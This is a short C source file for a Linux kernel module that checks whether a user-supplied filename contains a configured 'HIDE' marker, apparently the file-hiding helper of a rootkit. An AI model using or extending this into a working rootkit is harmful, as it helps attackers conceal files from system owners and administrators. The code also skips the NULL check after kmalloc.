#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/limits.h>
#include <linux/namei.h>

#include "dir.h"
#include "config.h"

int is_name_invisible(const char __user *filename)
{
	int ret = 0;
	char *name = kmalloc(PATH_MAX, GFP_KERNEL);

	if (strncpy_from_user(name, filename, PATH_MAX) > 0)
		if (strstr(name, HIDE))
		    ret = 1;

	kfree(name);
	return ret;
}